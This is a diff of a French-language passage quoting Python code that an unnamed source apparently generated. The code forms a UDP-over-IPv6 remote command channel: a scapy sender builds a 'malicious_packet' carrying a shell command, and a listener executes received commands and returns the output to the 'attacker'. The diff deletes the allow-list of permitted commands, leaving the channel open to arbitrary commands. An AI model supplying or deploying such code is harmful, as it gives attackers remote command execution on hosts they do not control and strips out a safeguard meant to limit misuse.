@@ -66,25 +66,19 @@ Voici les codes qu'il ma sortie :
 from scapy.all import *
 
 # Adresse IPv6 de la machine cible
-target_ip = "fe80::1"  # Remplace avec l'IPv6 de la cible
+target_ip = "fe80::1"  # Remplacer avec l'IPv6 de la cible
 target_port = 9000  # Port où le serveur écoute
 
-# Commande à exécuter (ex: "whoami")
+# Commande à exécuter (exemple : "whoami")
 cmd = "whoami"
 
-# Vérification que la commande est autorisée (exemple simple pour éviter des commandes malveillantes)
-allowed_commands = ["whoami", "hostname", "date"]
+# Création d'un paquet IPv6 contenant la commande
+malicious_packet = IPv6(dst=target_ip) / UDP(dport=target_port) / Raw(load=cmd)
 
-if cmd not in allowed_commands:
-    print(f"Commande non autorisée : {cmd}")
-else:
-    # Création d'un paquet IPv6 contenant la commande
-    malicious_packet = IPv6(dst=target_ip) / UDP(dport=target_port) / Raw(load=cmd)
+# Envoi du paquet
+send(malicious_packet)
 
-    # Envoi du paquet
-    send(malicious_packet)
-
-    print(f"Paquet IPv6 contenant '{cmd}' envoyé à {target_ip}")
+print(f"Paquet IPv6 contenant la commande '{cmd}' envoyé à {target_ip}")
 
 
 
@@ -125,7 +119,6 @@ while True:
         continue  # Ignore la commande malveillante
 
     # Sécurisation de l'exécution avec shlex pour éviter l'injection
-    # Cela permet de s'assurer que les arguments sont correctement échappés
     try:
         command_args = shlex.split(command)  # Sécurise la commande
         result = subprocess.check_output(command_args, stderr=subprocess.STDOUT, text=True)
@@ -135,6 +128,7 @@ while True:
     # Envoi de la réponse à l'attaquant
     sock.sendto(result.encode(), addr)
     print(f"Réponse envoyée : {result}")
+
 
 
 
